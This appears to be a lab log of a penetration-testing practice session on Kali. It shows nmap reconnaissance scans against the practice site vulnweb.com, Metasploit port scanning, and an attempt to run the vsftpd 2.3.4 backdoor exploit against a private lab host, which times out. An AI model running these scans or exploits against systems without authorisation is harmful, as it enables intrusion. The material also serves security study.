@@ -1,0 +1,191 @@
+┌──(crypl㉿kali)-[~]
+└─$ nmap -sn vulnweb.com
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 01:27 EDT
+Nmap scan report for vulnweb.com (44.228.249.3)
+Host is up (0.0020s latency).
+Other addresses for vulnweb.com (not scanned): 64:ff9b::2ce4:f903
+rDNS record for 44.228.249.3: ec2-44-228-249-3.us-west-2.compute.amazonaws.com
+Nmap done: 1 IP address (1 host up) scanned in 8.22 seconds
+
+┌──(crypl㉿kali)-[~]
+└─$ nmap -sS vulnweb.com
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 01:27 EDT
+Nmap scan report for vulnweb.com (44.228.249.3)
+Host is up (0.019s latency).
+Other addresses for vulnweb.com (not scanned): 64:ff9b::2ce4:f903
+rDNS record for 44.228.249.3: ec2-44-228-249-3.us-west-2.compute.amazonaws.com
+Not shown: 999 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 16.31 seconds
+
+┌──(crypl㉿kali)-[~]
+└─$ nmap -sV vulnweb.com
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 01:28 EDT
+Nmap scan report for vulnweb.com (44.228.249.3)
+Host is up (0.0011s latency).
+Other addresses for vulnweb.com (not scanned): 64:ff9b::2ce4:f903
+rDNS record for 44.228.249.3: ec2-44-228-249-3.us-west-2.compute.amazonaws.com
+All 1000 scanned ports on vulnweb.com (44.228.249.3) are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 4.57 seconds
+
+┌──(crypl㉿kali)-[~]
+└─$ nmap -p 80 --script http-headers vulnweb.com
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 01:29 EDT
+Nmap scan report for vulnweb.com (44.228.249.3)
+Host is up (0.0015s latency).
+Other addresses for vulnweb.com (not scanned): 64:ff9b::2ce4:f903                                                                                                                                                                          
+rDNS record for 44.228.249.3: ec2-44-228-249-3.us-west-2.compute.amazonaws.com                                                                                                                                                             
+                                                                                                                                                                                                                                           
+PORT   STATE    SERVICE                                                                                                                                                                                                                    
+80/tcp filtered http                                                                                                                                                                                                                       
+                                                                                                                                                                                                                                           
+Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds                                                                                                                                                                                
+                                                                                                                                                                                                                                           
+┌──(crypl㉿kali)-[~]                                                                                                                                                                                                                       
+└─$ nmap -sL vulnweb.com                                                                                                                                                                                                                   
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 01:29 EDT                                                                                                                                                                            
+Nmap scan report for vulnweb.com (44.228.249.3)                                                                                                                                                                                            
+Other addresses for vulnweb.com (not scanned): 64:ff9b::2ce4:f903
+rDNS record for 44.228.249.3: ec2-44-228-249-3.us-west-2.compute.amazonaws.com
+Nmap done: 1 IP address (0 hosts up) scanned in 0.03 seconds
+
+┌──(crypl㉿kali)-[~]
+└─$ nmap -sU vulnweb.com                                                                                                                                                                                                                    
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 01:29 EDT
+Nmap scan report for vulnweb.com (44.228.249.3)
+Host is up (0.0012s latency).
+Other addresses for vulnweb.com (not scanned): 64:ff9b::2ce4:f903
+rDNS record for 44.228.249.3: ec2-44-228-249-3.us-west-2.compute.amazonaws.com
+All 1000 scanned ports on vulnweb.com (44.228.249.3) are in ignored states.
+Not shown: 1000 open|filtered udp ports (no-response)
+
+Nmap done: 1 IP address (1 host up) scanned in 4.48 seconds
+
+┌──(crypl㉿kali)-[~]
+└─$ nmap -O vulnweb.com                                                                                                                                                                                                                     
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 01:29 EDT
+Nmap scan report for vulnweb.com (44.228.249.3)
+Host is up (0.0070s latency).
+Other addresses for vulnweb.com (not scanned): 64:ff9b::2ce4:f903
+rDNS record for 44.228.249.3: ec2-44-228-249-3.us-west-2.compute.amazonaws.com
+Not shown: 999 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+80/tcp open  http
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: phone|switch|VoIP adapter|bridge|general purpose
+Running (JUST GUESSING): Nokia Symbian OS (90%), Cisco embedded (87%), Oracle Virtualbox (85%), Slirp (85%), QEMU (85%)
+OS CPE: cpe:/o:nokia:symbian_os cpe:/h:cisco:catalyst_1900 cpe:/h:cisco:ata_188_voip_gateway cpe:/o:oracle:virtualbox cpe:/a:danny_gasparovski:slirp cpe:/a:qemu:qemu
+Aggressive OS guesses: Nokia 3600i mobile phone (90%), Cisco Catalyst 1900 switch (87%), Cisco ATA 188 VoIP adapter (85%), Oracle Virtualbox Slirp NAT bridge (85%), QEMU user mode network gateway (85%)
+No exact OS matches for host (test conditions non-ideal).
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.50 seconds
+
+┌──(crypl㉿kali)-[~]
+└─$ nmap -A vulnweb.com                                                                                                                                                                                                                     
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 01:30 EDT
+Nmap scan report for vulnweb.com (44.228.249.3)
+Host is up (0.0058s latency).
+Other addresses for vulnweb.com (not scanned): 64:ff9b::2ce4:f903
+rDNS record for 44.228.249.3: ec2-44-228-249-3.us-west-2.compute.amazonaws.com
+All 1000 scanned ports on vulnweb.com (44.228.249.3) are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: 3Com 4500G switch (92%), H3C Comware 5.20 (92%), Huawei VRP 8.100 (92%), Microsoft Windows Server 2003 SP1 (92%), Oracle Virtualbox Slirp NAT bridge (92%), QEMU user mode network gateway (92%), AXIS 2100 Network Camera (92%), D-Link DP-300U, DP-G310, or Hamlet HPS01UU print server (92%), HP Tru64 UNIX 5.1A (92%), Sanyo PLC-XU88 digital video projector (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   3.94 ms ec2-44-228-249-3.us-west-2.compute.amazonaws.com (44.228.249.3)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds
+
+┌──(crypl㉿kali)-[~]
+└─$ nmap -oN outputfile.nmap vulnweb.com                                                                                                                                                                                                    
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 01:30 EDT
+Nmap scan report for vulnweb.com (44.228.249.3)
+Host is up (0.0028s latency).
+Other addresses for vulnweb.com (not scanned): 64:ff9b::2ce4:f903
+rDNS record for 44.228.249.3: ec2-44-228-249-3.us-west-2.compute.amazonaws.com
+All 1000 scanned ports on vulnweb.com (44.228.249.3) are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+
+Nmap done: 1 IP address (1 host up) scanned in 4.30 seconds
+
+METASPLOIT:
+
+msf6 use auxiliary/scanner/portscan/tcp
+msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS vulnweb.com
+RHOSTS => vulnweb.com
+msf6 use auxiliary/scanner/portscan/tcp
+msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS vulnweb.com
+RHOSTS => vulnweb.com
+msf6 auxiliary(scanner/portscan/tcp) set ports 21,22,80,443
+ports => 21,22,80,443
+msf6 auxiliary(scanner/portscan/tcp) > set version true.
+version => true
+msf6 auxiliary(scanner/portscan/tcp) > run
+[+] 44.228.249.3          - 44.228.249.3:80 - TCP OPEN
+[*] Scanned 1 of 2 hosts (50% complete)
+[+] [64:ff9b::2ce4:f903]  - 64:ff9b::2ce4:f903:80 - TCP OPEN
+[*] Scanned 1 of 2 hosts (50% complete)
+[*] Scanned 2 of 2 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+msf6 > msfdb init
+msf6 > db_nmap -sV vulnweb.com
+[*] Nmap: Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 02:03 EDT
+[*] Nmap: Nmap scan report for vulnweb.com (44.228.249.3)
+[*] Nmap: Host is up (0.020s latency).
+[*] Nmap: Other addresses for vulnweb.com (not scanned): 64:ff9b::2ce4:f903
+[*] Nmap: rDNS record for 44.228.249.3: ec2-44-228-249-3.us-west-2.compute.amazonaws.com
+[*] Nmap: Not shown: 999 filtered tcp ports (no-response)
+[*] Nmap: PORT   STATE SERVICE    VERSION
+[*] Nmap: 80/tcp open  tcpwrapped
+[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 28.81 seconds
+
+msf6 > search vsftpd
+Matching Modules
+================
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
+   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > use exploit/unix/ftp/vsftpd_234_backdoor
+[*] Using configured payload cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   21               yes       The target port (TCP)
+Exploit target:
+Id  Name
+   --  ----
+   0   Automatic
+View the full module info with the info, or info -d command.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102
+RHOSTS => 192.168.56.102
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show payloads
+Compatible Payloads
+===================
+   #  Name                       Disclosure Date  Rank    Check  Description
+   -  ----                       ---------------  ----    -----  -----------
+   0  payload/cmd/unix/interact  .                normal  No     Unix Command, Interact with Established Connection
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set payload cmd/unix/interact
+payload => cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) set LHOST 192.168.56.101
+[!] Unknown datastore option: LHOST. Did you mean RHOST?
+LHOST => 192.168.56.101
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
+[-] 192.168.56.102:21 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection with (192.168.56.102:21) timed out.
+[*] Exploit completed, but no session was created
